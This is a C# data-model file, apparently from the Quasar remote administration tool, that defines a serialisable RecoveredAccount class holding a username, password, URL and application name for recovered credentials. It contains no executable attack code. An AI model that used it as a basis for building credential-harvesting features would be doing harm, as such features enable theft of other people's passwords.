using ProtoBuf;

namespace Quasar.Common.Models
{
    [ProtoContract]
    public class RecoveredAccount
    {
        [ProtoMember(1)]
        public string Username { get; set; }

        [ProtoMember(2)]
        public string Password { get; set; }

        [ProtoMember(3)]
        public string Url { get; set; }

        [ProtoMember(4)]
        public string Application { get; set; }
    }
}
